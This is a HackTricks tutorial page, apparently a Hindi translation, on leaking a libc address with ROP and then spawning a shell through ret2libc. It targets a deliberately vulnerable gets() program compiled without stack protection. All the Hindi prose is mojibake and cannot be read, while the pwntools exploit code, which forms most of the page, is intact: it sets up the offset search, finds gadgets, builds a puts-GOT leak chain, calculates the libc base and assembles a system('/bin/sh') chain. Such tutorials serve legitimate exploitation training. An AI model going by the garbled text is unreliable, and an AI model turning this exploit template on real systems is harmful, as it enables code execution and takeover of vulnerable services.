# ROP рдХреЗ рд╕рд╛рде libc рдкрддрд╛ рд▓реАрдХ рдХрд░рдирд╛

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **рд╣рдорд╛рд░рд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ** **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ PRs рдХреЛ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
{% endhint %}

## рддреНрд╡рд░рд┐рдд рд╕рд╛рд░рд╛рдВрд╢

1. **рдУрд╡рд░рдлреНрд▓реЛ** **рдСрдлрд╕реЗрдЯ** рдЦреЛрдЬреЗрдВ
2. `POP_RDI` рдЧреИрдЬреЗрдЯ, `PUTS_PLT` рдФрд░ `MAIN` рдЦреЛрдЬреЗрдВ
3. рдкрд┐рдЫрд▓реЗ рдЧреИрдЬреЗрдЯреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **puts рдпрд╛ рдЕрдиреНрдп libc рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдореЗрдореЛрд░реА рдкрддрд╛ рд▓реАрдХ рдХрд░реЗрдВ** рдФрд░ **libc рд╕рдВрд╕реНрдХрд░рдг рдЦреЛрдЬреЗрдВ** ([рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ](https://libc.blukat.me))
4. рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рд╕рд╛рде, **ROP рдХреА рдЧрдгрдирд╛ рдХрд░реЗрдВ рдФрд░ рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд░реЗрдВ**

## рдЕрднреНрдпрд╛рд╕ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓ рдФрд░ рдмрд╛рдЗрдирд░реА

рдпрд╣ рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓ рдЗрд╕ рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓ рдореЗрдВ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рдХреЛрдб/рдмрд╛рдЗрдирд░реА рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реИ: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
рдЕрдиреНрдп рдЙрдкрдпреЛрдЧреА рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

## рдХреЛрдб

рдлрд╛рдЗрд▓ рдХрд╛ рдирд╛рдо: `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector -no-pie
```
## ROP - LIBC рд▓реАрдХ рдХрд░рдиреЗ рдХрд╛ рдЯреЗрдореНрдкрд▓реЗрдЯ

рдореИрдВ рдЗрд╕ рдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдмрдирд╛рдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реВрдБред\
рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ рдХрдордЬреЛрд░ рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рдорд╛рди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд░рдЦреЗрдВ рдФрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЖрд╡рд╢реНрдпрдХ рдбреЗрдЯрд╛ рджреЗрдВ:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## 1- рдСрдлрд╕реЗрдЯ рдЦреЛрдЬрдирд╛

рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЛ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЗ рд╕рд╛рде рдЖрдЧреЗ рдмрдврд╝рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдПрдХ рдСрдлрд╕реЗрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдпрджрд┐ рдХреЛрдИ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдпрд╣ рдЗрд╕реЗ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**Execute** `python template.py` рдПрдХ GDB рдХрдВрд╕реЛрд▓ рдЦреЛрд▓рд╛ рдЬрд╛рдПрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреНрд░реИрд╢ рд╣реЛ рд░рд╣рд╛ рд╣реИред рдЙрд╕ **GDB рдХрдВрд╕реЛрд▓** рдХреЗ рдЕрдВрджрд░ `x/wx $rsp` рдЪрд▓рд╛рдПрдБ рддрд╛рдХрд┐ **bytes** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗрдВ рдЬреЛ RIP рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдереЗред рдЕрдВрдд рдореЗрдВ рдПрдХ **python** рдХрдВрд╕реЛрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **offset** рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../../../.gitbook/assets/image (140).png>)

рдСрдлрд╕реЗрдЯ (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ 40) рдЦреЛрдЬрдиреЗ рдХреЗ рдмрд╛рдж, рдЙрд╕ рдорд╛рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЗ рдЕрдВрджрд░ OFFSET рдЪрд░ рдХреЛ рдмрджрд▓реЗрдВред\
`OFFSET = "A" * 40`

рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рд╣реЛрдЧрд╛: `pattern create 1000` -- _ret рддрдХ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ_ -- `pattern seach $rsp` GEF рд╕реЗред

## 2- рдЧреИрдЬреЗрдЯреНрд╕ рдЦреЛрдЬрдирд╛

рдЕрдм рд╣рдореЗрдВ рдмрд╛рдЗрдирд░реА рдХреЗ рдЕрдВрджрд░ ROP рдЧреИрдЬреЗрдЯреНрд╕ рдЦреЛрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдпреЗ ROP рдЧреИрдЬреЗрдЯреНрд╕ `puts` рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛрдВрдЧреЗ рддрд╛рдХрд┐ **libc** рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдФрд░ рдмрд╛рдж рдореЗрдВ **рдЕрдВрддрд┐рдо рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд▓реЙрдиреНрдЪ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
The `PUTS_PLT` **рдлрдВрдХреНрд╢рди puts** рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИред\
The `MAIN_PLT` **рдлрдВрдХреНрд╢рди main** рдХреЛ рдлрд┐рд░ рд╕реЗ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИ рдПрдХ рдЗрдВрдЯрд░реИрдХреНрд╢рди рдХреЗ рдмрд╛рдж **overflow** рдХреЛ **рдлрд┐рд░ рд╕реЗ** **explo╨╕╤В** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП (рдЕрд╕реАрдорд┐рдд рд░рд╛рдЙрдВрдбреНрд╕ рдХрд╛ рд╢реЛрд╖рдг)ред **рдпрд╣ рдкреНрд░рддреНрдпреЗрдХ ROP рдХреЗ рдЕрдВрдд рдореЗрдВ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдлрд┐рд░ рд╕реЗ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред\
The **POP\_RDI** рдХреЛ рдХреЙрд▓ рдХрд┐рдП рдЧрдП рдлрдВрдХреНрд╢рди рдХреЛ **рдкреИрд░рд╛рдореАрдЯрд░** **рдкрд╛рд╕** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИред

рдЗрд╕ рдЪрд░рдг рдореЗрдВ рдЖрдкрдХреЛ рдХреБрдЫ рднреА рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╕рдм рдХреБрдЫ pwntools рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рджреМрд░рд╛рди рдкрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

## 3- libc рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдЦреЛрдЬрдирд╛

рдЕрдм рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рд╕рдордп рд╣реИ рдХрд┐ рдХреМрди рд╕реА **libc** рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХрд╛ рд╕рдВрд╕реНрдХрд░рдг рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдо **рдлрдВрдХреНрд╢рди** `puts` рдХреЗ рдореЗрдореЛрд░реА рдореЗрдВ **рдкрддрд╛** рдХреЛ **leak** рдХрд░рдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рд╣рдо рдпрд╣ **рдЦреЛрдЬрдиреЗ** рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ рдХрд┐ рдЙрд╕ рдкрддреЗ рдореЗрдВ puts рд╕рдВрд╕реНрдХрд░рдг рдХрд┐рд╕ **рд▓рд╛рдЗрдмреНрд░реЗрд░реА рд╕рдВрд╕реНрдХрд░рдг** рдореЗрдВ рд╣реИред
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
рдЗрд╕рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреЛрдб рдХреА рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкрдВрдХреНрддрд┐ рд╣реИ:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
рдпрд╣ рдХреБрдЫ рдмрд╛рдЗрдЯреНрд╕ рднреЗрдЬреЗрдЧрд╛ рдЬрдм рддрдХ рдХрд┐ **RIP** рдХреЛ **overwriting** рдХрд░рдирд╛ рд╕рдВрднрд╡ рди рд╣реЛ: `OFFSET`.\
рдлрд┐рд░, рдпрд╣ **address** рдХреЛ рд╕реЗрдЯ рдХрд░реЗрдЧрд╛ `POP_RDI` рдХрд╛ рддрд╛рдХрд┐ рдЕрдЧрд▓рд╛ address (`FUNC_GOT`) **RDI** рд░рдЬрд┐рд╕реНрдЯреНрд░рд┐ рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЬрд╛ рд╕рдХреЗред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ рд╣рдо **call puts** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ **passing** рдЗрд╕реЗ `PUTS_GOT` рдХрд╛ **address** рдХреНрдпреЛрдВрдХрд┐ рдореЗрдореЛрд░реА рдореЗрдВ puts рдлрд╝рдВрдХреНрд╢рди рдХрд╛ address `PUTS_GOT` рджреНрд╡рд╛рд░рд╛ рдЗрдВрдЧрд┐рдд address рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЧрдпрд╛ рд╣реИред\
рдЗрд╕рдХреЗ рдмрд╛рдж, `PUTS_PLT` рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ (рдЬрд┐рд╕рдореЗрдВ `PUTS_GOT` **RDI** рдХреЗ рдЕрдВрджрд░ рд╣реИ) рддрд╛рдХрд┐ puts **read the content** рдХрд░реЗ `PUTS_GOT` рдХреЗ рдЕрдВрджрд░ (**рдореЗрдореЛрд░реА рдореЗрдВ puts рдлрд╝рдВрдХреНрд╢рди рдХрд╛ address**) рдФрд░ рдЗрд╕реЗ **print out** рдХрд░реЗред\
рдЕрдВрдд рдореЗрдВ, **main function рдХреЛ рдлрд┐рд░ рд╕реЗ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рддрд╛рдХрд┐ рд╣рдо рдлрд┐рд░ рд╕реЗ overflow рдХрд╛ рдлрд╛рдпрджрд╛ рдЙрдард╛ рд╕рдХреЗрдВред

рдЗрд╕ рддрд░рд╣ рд╣рдордиреЗ **puts function** рдХреЛ **print** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **tricked** рдХрд┐рдпрд╛ рд╣реИ **memory** рдореЗрдВ рдлрд╝рдВрдХреНрд╢рди **puts** рдХрд╛ **address** (рдЬреЛ **libc** рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЗ рдЕрдВрджрд░ рд╣реИ)ред рдЕрдм рдЬрдм рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рд╡рд╣ address рд╣реИ, рд╣рдо **search рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреМрди рд╕рд╛ libc рд╕рдВрд╕реНрдХрд░рдг рдЙрдкрдпреЛрдЧ рдореЗрдВ рд╣реИ**ред

![](<../../../../../.gitbook/assets/image (141).png>)

рдЪреВрдВрдХрд┐ рд╣рдо рдХреБрдЫ **local** рдмрд╛рдЗрдирд░реА рдХрд╛ **exploiting** рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ **рдирд╣реАрдВ рдЖрд╡рд╢реНрдпрдХ** рд╣реИ рдХрд┐ рдХреМрди рд╕рд╛ **libc** рд╕рдВрд╕реНрдХрд░рдг рдЙрдкрдпреЛрдЧ рдореЗрдВ рд╣реИ (рдмрд╕ `/lib/x86_64-linux-gnu/libc.so.6` рдореЗрдВ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдЦреЛрдЬреЗрдВ)ред\
рд▓реЗрдХрд┐рди, рдПрдХ рджреВрд░рд╕реНрде exploit рдорд╛рдорд▓реЗ рдореЗрдВ рдореИрдВ рдпрд╣рд╛рдБ рдмрддрд╛рдКрдВрдЧрд╛ рдХрд┐ рдЖрдк рдЗрд╕реЗ рдХреИрд╕реЗ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ:

### 3.1- libc рд╕рдВрд╕реНрдХрд░рдг рдХреА рдЦреЛрдЬ (1)

рдЖрдк рд╡реЗрдм рдкреГрд╖реНрда рдкрд░ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреМрди рд╕реА рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдЙрдкрдпреЛрдЧ рдореЗрдВ рд╣реИ: [https://libc.blukat.me/](https://libc.blukat.me)\
рдпрд╣ рдЖрдкрдХреЛ **libc** рдХреЗ рдЦреЛрдЬреЗ рдЧрдП рд╕рдВрд╕реНрдХрд░рдг рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рднреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред

![](<../../../../../.gitbook/assets/image (142).png>)

### 3.2- libc рд╕рдВрд╕реНрдХрд░рдг рдХреА рдЦреЛрдЬ (2)

рдЖрдк рдпрд╣ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

рдЗрд╕рдореЗрдВ рдХреБрдЫ рд╕рдордп рд▓рдЧреЗрдЧрд╛, рдзреИрд░реНрдп рд░рдЦреЗрдВред\
рдЗрд╕рдХреЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдореЗрдВ рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:

* Libc symbol name: `puts`
* Leaked libc adddress: `0x7ff629878690`

рд╣рдо рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреМрди рд╕рд╛ **libc** рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
```bash
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
рд╣рдореЗрдВ 2 рдореИрдЪ рдорд┐рд▓рддреЗ рд╣реИрдВ (рдпрджрд┐ рдкрд╣рд▓рд╛ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдкрдХреЛ рджреВрд╕рд░реЗ рдХреЛ рдЖрдЬрдорд╛рдирд╛ рдЪрд╛рд╣рд┐рдП)ред рдкрд╣рд▓реЗ рд╡рд╛рд▓реЗ рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ:
```bash
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
`libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` рд╕реЗ libc рдХреЛ рд╣рдорд╛рд░реА рдХрд╛рд░реНрдпрд╢реАрд▓ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдХреЙрдкреА рдХрд░реЗрдВред

### 3.3- рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рдлрд╝рдВрдХреНрд╢рди
```python
puts
printf
__libc_start_main
read
gets
```
## 4- libc рдкрддреЗ рдХреЛ рдЦреЛрдЬрдирд╛ рдФрд░ рд╢реЛрд╖рдг рдХрд░рдирд╛

рдЗрд╕ рдмрд┐рдВрджреБ рдкрд░ рд╣рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА libc рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкрддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рдЪреВрдВрдХрд┐ рд╣рдо рдПрдХ рд╕реНрдерд╛рдиреАрдп рдмрд╛рдЗрдирд░реА рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рдореИрдВ рдмрд╕ рдЙрдкрдпреЛрдЧ рдХрд░реВрдВрдЧрд╛: `/lib/x86_64-linux-gnu/libc.so.6`

рддреЛ, `template.py` рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ **libc** рдЪрд░ рдХреЛ рдмрджрд▓реЗрдВ: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #рдЬрдм рдкрддрд╛ рд╣реЛ рддреЛ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛ рдкрде рд╕реЗрдЯ рдХрд░реЗрдВ`

**libc рдкреБрд╕реНрддрдХрд╛рд▓рдп** рдХреЛ **рдкрде** рджреЗрдиреЗ рд╕реЗ **рд╢реЗрд╖ рд╢реЛрд╖рдг рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЧрдгрдирд╛ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред

`get_addr` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдЕрдВрджрд░ **libc рдХрд╛ рдЖрдзрд╛рд░ рдкрддрд╛** рдЧрдгрдирд╛ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдЕрдВрддрд┐рдо libc рдмреЗрд╕ рдкрддрд╛ 00 рдкрд░ рд╕рдорд╛рдкреНрдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП**ред рдпрджрд┐ рдРрд╕рд╛ рдирд╣реАрдВ рд╣реИ, рддреЛ рдЖрдк рдПрдХ рдЧрд▓рдд рдкреБрд╕реНрддрдХрд╛рд▓рдп рд▓реАрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

рдлрд┐рд░, рдлрд╝рдВрдХреНрд╢рди `system` рдХрд╛ рдкрддрд╛ рдФрд░ рд╕реНрдЯреНрд░рд┐рдВрдЧ _"/bin/sh"_ рдХрд╛ **рдкрддрд╛** **libc** рдХреЗ **рдмреЗрд╕ рдкрддреЗ** рд╕реЗ **рдЧрдгрдирд╛** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ **libc рдкреБрд╕реНрддрдХрд╛рд▓рдп** рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
рдЕрдВрдд рдореЗрдВ, /bin/sh рдирд┐рд╖реНрдкрд╛рджрди рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
рдЖрдЗрдП рдЗрд╕ рдЕрдВрддрд┐рдо ROP рдХреЛ рд╕рдордЭрд╛рддреЗ рд╣реИрдВред\
рдЕрдВрддрд┐рдо ROP (`rop1`) рдиреЗ рдлрд┐рд░ рд╕реЗ рдореБрдЦреНрдп рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛, рдлрд┐рд░ рд╣рдо **рдлрд┐рд░ рд╕реЗ рд╢реЛрд╖рдг** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдУрд╡рд░рдлреНрд▓реЛ** (рдЗрд╕рд▓рд┐рдП `OFFSET` рдпрд╣рд╛рдБ рдлрд┐рд░ рд╕реЗ рд╣реИ)ред рдлрд┐рд░, рд╣рдо `POP_RDI` рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдЬреЛ _"/bin/sh"_ (`BINSH`) рдХреЗ **рдкрддреЗ** рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИ рдФрд░ **system** рдлрд╝рдВрдХреНрд╢рди (`SYSTEM`) рдХреЛ рдХреЙрд▓ рдХрд░рддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ _"/bin/sh"_ рдХрд╛ рдкрддрд╛ рдПрдХ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред\
рдЕрдВрдд рдореЗрдВ, **exit рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛** **рдХреЙрд▓** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ **рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рд╕рдорд╛рдкреНрдд** рд╣реЛ рдЬрд╛рдП рдФрд░ рдХреЛрдИ рдЕрд▓рд░реНрдЯ рдЙрддреНрдкрдиреНрди рди рд╣реЛред

**рдЗрд╕ рддрд░рд╣ рд╢реЛрд╖рдг рдПрдХ \_/bin/sh**\_\*\* рд╢реЗрд▓ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛ред\*\*

![](<../../../../../.gitbook/assets/image (143).png>)

